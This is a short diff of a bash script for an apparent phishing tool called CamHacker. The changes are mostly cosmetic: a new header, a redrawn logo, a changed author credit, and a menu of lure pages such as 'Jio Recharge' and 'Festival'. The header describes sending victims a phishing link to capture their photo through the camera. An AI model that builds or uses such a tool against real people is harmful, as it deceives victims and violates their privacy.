@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# CamHacker
+# Version    : 1.5
+# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+
 # Colors
 
 black="\033[1;30m"
@@ -29,13 +33,13 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}  ____              
-${red} / ___|__ _ _ __ ___  _ _                          
-${cyan}| |   / _' | '_ ' _  | | _ _ __| | ___ _ __
-${purple}| |__| (_| | | | | | | | | | |/ _` |/ _ \ '_ \
-${yellow} \____\__,_|_| |_| | |__| |_| | (_| | __/ | | |
-${red}                    |_____\__,_|\__,_|\___|_| |_|  [v${version}]
-${blue}                                    [By Luden]
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
+${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
+${red}                                            [v${version}]
+${blue}                                    [By KasRoudra]
 "
 
 ngrok_help="
@@ -438,7 +442,6 @@ clear
 echo -e "$logo"
 sleep 1
 echo -e "${ask}Choose an option:
-
 ${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
 ${cyan}[${white}2${cyan}] ${yellow}Festival
 ${cyan}[${white}3${cyan}] ${yellow}Live Youtube
